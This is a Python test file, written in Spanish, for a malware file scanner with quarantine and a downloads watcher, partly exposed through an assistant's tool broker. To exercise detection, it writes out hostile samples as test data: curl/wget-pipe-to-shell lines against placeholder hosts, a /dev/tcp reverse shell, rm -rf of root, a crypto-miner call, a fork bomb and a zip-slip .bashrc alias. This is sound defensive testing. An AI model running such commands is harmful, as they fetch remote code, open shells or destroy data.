"""Pruebas del analizador de archivos. Las muestras se crean en cada prueba y no hacen nada:
solo contienen los patrones que el analizador debe reconocer."""

import io
import os
import stat
import tarfile
import zipfile

import pytest

from umbra import scanner
from umbra.nyx.format import format_result
from umbra.scanner import EICAR, PELIGROSO, PRECAUCION, SEGURO


def scan(path, **kw):
    return scanner.scan(path, antivirus=False, blocklist={}, **kw)


def write(tmp_path, name, data, mode=0o644):
    p = tmp_path / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    os.chmod(p, mode)
    return p


def test_plain_files_are_safe(tmp_path):
    assert scan(write(tmp_path, "notas.txt", "Lista de la compra: pan, leche")).verdict == SEGURO
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
    r = scan(write(tmp_path, "foto.png", png))
    assert r.verdict == SEGURO and r.kind == "imagen"
    pdf = b"%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n%%EOF"
    assert scan(write(tmp_path, "factura.pdf", pdf)).verdict == SEGURO


def test_eicar_is_dangerous(tmp_path):
    r = scan(write(tmp_path, "prueba.txt", EICAR))
    assert r.verdict == PELIGROSO
    assert any("EICAR" in f.message for f in r.findings)


def test_double_extension_and_disguised_program(tmp_path):
    r = scan(write(tmp_path, "factura.pdf.exe", b"MZ\x90\x00" + b"\x00" * 200))
    assert r.verdict == PELIGROSO and r.kind == "pe"
    assert any("doble extensión" in f.message for f in r.findings)
    # Un programa de Linux con nombre de foto
    r = scan(write(tmp_path, "vacaciones.jpg", b"\x7fELF\x02\x01\x01" + b"\x00" * 200))
    assert r.verdict == PELIGROSO
    assert any("dice ser JPG" in f.message for f in r.findings)


def test_right_to_left_override_in_name(tmp_path):
    r = scan(write(tmp_path, "foto" + chr(0x202E) + "gpj.sh", "#!/bin/sh\necho hola\n"))
    assert r.verdict == PELIGROSO
    assert any("invisibles" in f.message for f in r.findings)


@pytest.mark.parametrize("body, needle", [
    ("curl -fsSL http://ejemplo.invalid/x.sh | sh", "curl/wget | sh"),
    ("echo ZWNobyBob2xh | base64 -d | bash", "base64"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "/dev/tcp"),
    ("rm -rf --no-preserve-root /", "rm -rf"),
    ("./xmrig -o stratum+tcp://pool.invalid:3333", "minero"),
    (":(){ :|:& };:", "bomba fork"),
])
def test_dangerous_scripts(tmp_path, body, needle):
    r = scan(write(tmp_path, "instalar.sh", f"#!/bin/bash\n{body}\n", 0o755))
    assert r.verdict == PELIGROSO
    assert any(needle in f.message for f in r.findings), [f.message for f in r.findings]


def test_normal_script_is_only_caution(tmp_path):
    r = scan(write(tmp_path, "copia.sh", "#!/bin/sh\ncp -r ~/Documentos /media/usb/\n", 0o755))
    assert r.verdict == PRECAUCION


def test_desktop_launcher_with_hidden_command(tmp_path):
    body = "[Desktop Entry]\nType=Application\nName=Factura\nExec=sh -c 'wget -qO- http://x.invalid | sh'\n"
    r = scan(write(tmp_path, "Factura.desktop", body))
    assert r.verdict == PELIGROSO


def test_pdf_with_auto_javascript_and_launch(tmp_path):
    pdf = b"%PDF-1.5\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n%%EOF"
    assert scan(write(tmp_path, "a.pdf", pdf)).verdict == PELIGROSO
    pdf2 = b"%PDF-1.5\n<< /S /Launch /F (cmd.exe) >>\n%%EOF"
    assert scan(write(tmp_path, "b.pdf", pdf2)).verdict == PELIGROSO
    pdf3 = b"%PDF-1.5\n<< /Names << /JavaScript 3 0 R >> >>\n%%EOF"
    assert scan(write(tmp_path, "c.pdf", pdf3)).verdict == PRECAUCION


def test_office_macros(tmp_path):
    p = tmp_path / "nominas.docm"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0macro")
    r = scan(p)
    assert r.kind == "office" and r.verdict == PRECAUCION
    assert any("macros" in f.message for f in r.findings)
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 50 + b"_VBA_PROJECT AutoOpen WScript.Shell"
    assert scan(write(tmp_path, "viejo.doc", ole)).verdict == PELIGROSO


def test_zip_contents_are_inspected(tmp_path):
    p = tmp_path / "fotos.zip"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("fotos/playa.jpg", b"\xff\xd8\xff" + b"\x00" * 50)
        z.writestr("fotos/ver_fotos.jpg.exe", b"MZ" + b"\x00" * 50)
        z.writestr("../../.bashrc", "alias ls='rm -rf ~'")
        z.writestr("leeme.txt", EICAR)
    r = scan(p)
    msgs = " | ".join(f.message for f in r.findings)
    assert r.verdict == PELIGROSO
    assert "doble extensión" in msgs and "fuera de su carpeta" in msgs and "EICAR" in msgs


def test_zip_bomb(tmp_path):
    p = tmp_path / "bomba.zip"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        with z.open("ceros.bin", "w", force_zip64=True) as f:
            chunk = b"\x00" * (8 * 1024 * 1024)
            for _ in range(140):  # 1,1 GiB de ceros -> poco más de 1 MB comprimido
                f.write(chunk)
    r = scan(p)
    assert r.verdict == PELIGROSO
    assert any("bomba zip" in f.message for f in r.findings)


def test_encrypted_zip_is_caution(tmp_path):
    p = tmp_path / "secreto.zip"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("a.txt", "hola")
    data = bytearray(p.read_bytes())
    # Marca los archivos como cifrados (bit 0 de las cabeceras local y central)
    for sig in (b"PK\x03\x04", b"PK\x01\x02"):
        i = data.find(sig)
        off = i + (6 if sig == b"PK\x03\x04" else 8)
        data[off] |= 1
    p.write_bytes(bytes(data))
    r = scan(p)
    assert any("contraseña" in f.message for f in r.findings)


def test_tar_with_setuid_and_script(tmp_path):
    p = tmp_path / "herramientas.tar.gz"
    with tarfile.open(p, "w:gz") as t:
        info = tarfile.TarInfo("bin/ayuda")
        payload = b"\x7fELF" + b"\x00" * 20
        info.size, info.mode = len(payload), 0o4755
        t.addfile(info, io.BytesIO(payload))
        script = b"#!/bin/sh\nwget http://x.invalid/a -O- | sh\n"
        info = tarfile.TarInfo("instalar.sh")
        info.size = len(script)
        t.addfile(info, io.BytesIO(script))
    r = scan(p)
    assert r.verdict == PELIGROSO
    msgs = " | ".join(f.message for f in r.findings)
    assert "setuid" in msgs and "curl/wget" in msgs


def _ar(members):
    out = b"!<arch>\n"
    for name, data in members:
        hdr = f"{name + '/':<16}{0:<12}{0:<6}{0:<6}{100644:<8}{len(data):<10}`\n".encode()
        out += hdr + data + (b"\n" if len(data) % 2 else b"")
    return out


def test_deb_postinst_is_checked(tmp_path):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        post = b"#!/bin/sh\ncurl http://x.invalid/p | sh\n"
        info = tarfile.TarInfo("./postinst")
        info.size, info.mode = len(post), 0o755
        t.addfile(info, io.BytesIO(post))
    deb = _ar([("debian-binary", b"2.0\n"), ("control.tar.gz", buf.getvalue()), ("data.tar.xz", b"")])
    r = scan(write(tmp_path, "juego.deb", deb))
    assert r.kind == "deb" and r.verdict == PELIGROSO
    assert any("postinst" in f.message for f in r.findings)


def test_blocklist(tmp_path):
    p = write(tmp_path, "inocente.txt", "parece normal")
    digest = scan(p).sha256
    lista = tmp_path / "firmas.txt"
    lista.write_text(f"# comentario\n{digest}  Troyano.Prueba\n")
    r = scanner.scan(p, antivirus=False, blocklist=scanner.load_blocklist([lista]))
    assert r.verdict == PELIGROSO and "Troyano.Prueba" in r.findings[0].message


def test_quarantine_restore_and_delete(tmp_path):
    q = tmp_path / "cuarentena"
    q.mkdir()
    p = write(tmp_path, "malo.sh", "#!/bin/sh\ncurl http://x.invalid | sh\n", 0o755)
    meta = scanner.quarantine(p, qdir=q)
    assert not p.exists() and meta["veredicto"] == PELIGROSO
    stored = q / f"{meta['id']}.bin"
    assert stat.S_IMODE(stored.stat().st_mode) == 0  # nadie puede leerlo ni ejecutarlo
    assert [i["nombre"] for i in scanner.quarantined(q)] == ["malo.sh"]
    out = scanner.restore("malo.sh", q)
    restored = tmp_path / "malo.sh"
    assert out["restaurado"] == str(restored) and restored.exists()
    assert not restored.stat().st_mode & 0o111  # vuelve sin permiso de ejecución
    meta = scanner.quarantine(restored, qdir=q)
    scanner.delete_quarantined(meta["id"], q)
    assert scanner.quarantined(q) == [] and not list(q.iterdir())


def test_restore_never_overwrites(tmp_path):
    q = tmp_path / "q"
    q.mkdir()
    p = write(tmp_path, "doc.txt", "uno")
    scanner.quarantine(p, qdir=q)
    write(tmp_path, "doc.txt", "otro nuevo")
    out = scanner.restore("doc.txt", q)
    assert "restaurado 1" in out["restaurado"]
    assert (tmp_path / "doc.txt").read_text() == "otro nuevo"


def test_summary_and_format(tmp_path):
    r = scan(write(tmp_path, "x.pdf.exe", b"MZ" + b"\x00" * 10))
    assert r.summary().startswith("Cuidado: x.pdf.exe es peligroso")


# ---- integración con NYX (broker, permisos y confirmación) ----

def test_nyx_scan_through_broker(broker, tmp_path, monkeypatch):
    monkeypatch.setattr(scanner, "clamav", lambda p, timeout=120, slow=True: ("no disponible", None))
    monkeypatch.setattr(scanner, "load_blocklist", lambda paths=None: {})
    p = write(tmp_path, "oferta.pdf.exe", b"MZ" + b"\x00" * 10)
    from umbra.security import ToolCall

    res = broker.execute(ToolCall("security.scan", {"path": str(p)}))
    assert res.ok and res.output["verdict"] == PELIGROSO
    text = format_result(res)
    assert "PELIGROSO" in text and "cuarentena" in text


def test_quarantine_needs_permission_and_confirmation(tmp_path, memory, audit, monkeypatch):
    from umbra.modules import builtin_modules
    from umbra.security import Broker, Permission, Policy, ToolCall

    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "datos"))
    p = write(tmp_path, "malo.sh", "#!/bin/sh\ncurl x | sh\n")

    # Sin el permiso files.write en la política: denegado
    b = Broker(Policy(), audit)
    for m in builtin_modules([tmp_path], memory, tmp_path / ".undo"):
        b.register(m)
    assert b.execute(ToolCall("security.quarantine", {"path": str(p)})).status == "denied"

    # Con permiso, pero el usuario cancela: no se mueve nada
    pol = Policy(module_grants={"security": frozenset({Permission.FILES_WRITE})})
    b = Broker(pol, audit, confirm=lambda action, args: False)
    for m in builtin_modules([tmp_path], memory, tmp_path / ".undo"):
        b.register(m)
    assert b.execute(ToolCall("security.quarantine", {"path": str(p)})).status == "cancelled"
    assert p.exists()

    b = Broker(pol, audit, confirm=lambda action, args: True)
    for m in builtin_modules([tmp_path], memory, tmp_path / ".undo"):
        b.register(m)
    res = b.execute(ToolCall("security.quarantine", {"path": str(p)}))
    assert res.ok and not p.exists()


def test_scan_outside_allowed_roots_is_denied(broker):
    from umbra.security import ToolCall

    res = broker.execute(ToolCall("security.scan", {"path": "/etc/passwd"}))
    assert not res.ok


@pytest.mark.parametrize("frase, accion, args", [
    ("¿es seguro factura.pdf.exe?", "security.scan", {"path": "factura.pdf.exe"}),
    ("Nyx, ¿tiene virus ~/Descargas/juego.AppImage?", "security.scan", {"path": "~/Descargas/juego.AppImage"}),
    ("analiza las descargas", "security.scan_folder", {"path": ""}),
    ("pon en cuarentena instalador.sh", "security.quarantine", {"path": "instalador.sh"}),
    ("¿qué hay en la cuarentena?", "security.quarantine_list", {}),
    ("restaura instalador.sh de la cuarentena", "security.restore", {"id": "instalador.sh"}),
    ("¿estoy protegido?", "security.status", {}),
])
def test_security_rules(frase, accion, args):
    from umbra.nyx.rules import match

    plan = match(frase)
    assert plan and plan.calls[0].action_id == accion and plan.calls[0].args == args


def test_path_rule_strips_question_mark():
    from umbra.nyx.rules import match

    assert match("¿cuánto ocupa ~/Descargas?").calls[0].args["path"] == "~/Descargas"


# ---- vigía de descargas ----

class FakeClock:
    def __init__(self):
        self.t = 0.0

    def __call__(self):
        return self.t


def test_watcher_waits_until_download_finishes(tmp_path):
    from umbra.vigia import Watcher

    write(tmp_path, "viejo.txt", "ya estaba")  # lo que había al arrancar no se analiza
    clock, seen = FakeClock(), []
    w = Watcher(tmp_path, seen.append, settle=2.0, clock=clock,
                scan_fn=lambda p: scanner.scan(p, antivirus=False, blocklist={}))
    write(tmp_path, "juego.zip.crdownload", "a medias")  # Chrome todavía descargando
    assert w.poll() == []
    p = write(tmp_path, "factura.pdf.exe", b"MZ" + b"\x00" * 10)
    assert w.poll() == []  # recién aparecido: espera a que el tamaño no cambie
    clock.t = 1.0
    with open(p, "ab") as f:
        f.write(b"\x00" * 100)  # sigue creciendo
    assert w.poll() == []
    clock.t = 2.0
    assert w.poll() == []
    clock.t = 4.5
    reports = w.poll()
    assert [r.name for r in reports] == ["factura.pdf.exe"] and reports[0].verdict == PELIGROSO
    clock.t = 10
    assert w.poll() == []  # no se analiza dos veces
    assert [r.name for r in seen] == ["factura.pdf.exe"]


def test_watcher_idle_skips_reading_folder(tmp_path, monkeypatch):
    """Sin cambios en la carpeta, el vigía no la vuelve a leer (solo un stat)."""
    import os

    from umbra import vigia

    clock, calls = FakeClock(), []
    w = vigia.Watcher(tmp_path, lambda r: None, clock=clock,
                      scan_fn=lambda p: scanner.scan(p, antivirus=False, blocklist={}))
    real = os.scandir
    monkeypatch.setattr(vigia.os, "scandir", lambda p: calls.append(p) or real(p))
    for t in range(1, 20):
        clock.t = t
        assert w.poll() == []
    assert calls == []  # 19 sondeos sin leer la carpeta
    os.utime(tmp_path, ns=(1, 1))  # la carpeta cambia (un archivo nuevo, renombrado o borrado)
    w.poll()
    assert len(calls) == 1
    clock.t = 20 + vigia.FULL_EVERY  # repaso completo de seguridad
    w.poll()
    assert len(calls) == 2


def test_watcher_idle_still_finds_new_download(tmp_path):
    from umbra.vigia import Watcher

    clock, seen = FakeClock(), []
    w = Watcher(tmp_path, seen.append, settle=1.0, clock=clock,
                scan_fn=lambda p: scanner.scan(p, antivirus=False, blocklist={}))
    clock.t = 1
    assert w.poll() == []
    write(tmp_path, "nuevo.sh", "#!/bin/sh\necho hola\n", 0o755)
    clock.t = 2
    w.poll()
    clock.t = 3.5
    assert [r.name for r in w.poll()] == ["nuevo.sh"]


def test_react_strips_exec_and_audits(tmp_path, audit):
    from umbra.vigia import Settings, react

    p = write(tmp_path, "instalar.sh", "#!/bin/sh\ncurl http://x.invalid | sh\n", 0o755)
    rep = scan(p)
    did = react(rep, Settings(avisar_seguros=False), audit, launch_alert=False)
    assert "sin permiso de ejecución" in did
    assert not p.stat().st_mode & 0o111
    entry = audit.tail(1)[0]
    assert entry["action"] == "vigia.analisis" and entry["status"] == PELIGROSO


def test_settings_roundtrip(tmp_path):
    from umbra.vigia import Settings, load_settings, save_settings

    path = tmp_path / "seguridad.toml"
    assert load_settings(path) == Settings()
    save_settings(Settings(vigia=False, voz=False), path)
    assert load_settings(path) == Settings(vigia=False, voz=False)
    path.write_text("vigia = 'quizá'\n")  # valor raro: se ignora y queda el seguro por defecto
    assert load_settings(path).vigia is True


def test_vigia_once_reports_existing_files(tmp_path, monkeypatch, capsys):
    from umbra import vigia

    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    monkeypatch.setattr(scanner, "clamav", lambda p, timeout=120, slow=True: ("no disponible", None))
    (tmp_path / "Descargas").mkdir()
    write(tmp_path / "Descargas", "notas.txt", "hola")
    write(tmp_path / "Descargas", "oferta.jpg.exe", b"MZ" + b"\x00" * 8)
    code = vigia.main(["--una-vez", "--carpeta", str(tmp_path / "Descargas")])
    out = capsys.readouterr().out
    assert code == 1 and "Peligroso" in out and "oferta.jpg.exe" in out and "notas.txt" in out
